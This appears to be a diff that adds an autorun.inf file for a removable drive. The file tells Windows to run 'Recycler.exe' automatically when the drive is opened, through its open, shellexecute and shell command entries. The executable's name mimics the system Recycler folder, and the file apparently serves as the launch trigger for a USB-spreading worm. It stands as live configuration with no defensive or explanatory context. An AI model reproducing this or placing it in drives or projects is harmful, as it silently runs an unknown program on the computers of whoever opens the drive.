@@ -1,0 +1,5 @@
+[autorun]
+open=Recycler.exe
+shellexecute=Recycler.exe
+shell\Auto\command=Recycler.exe
+shell=Auto
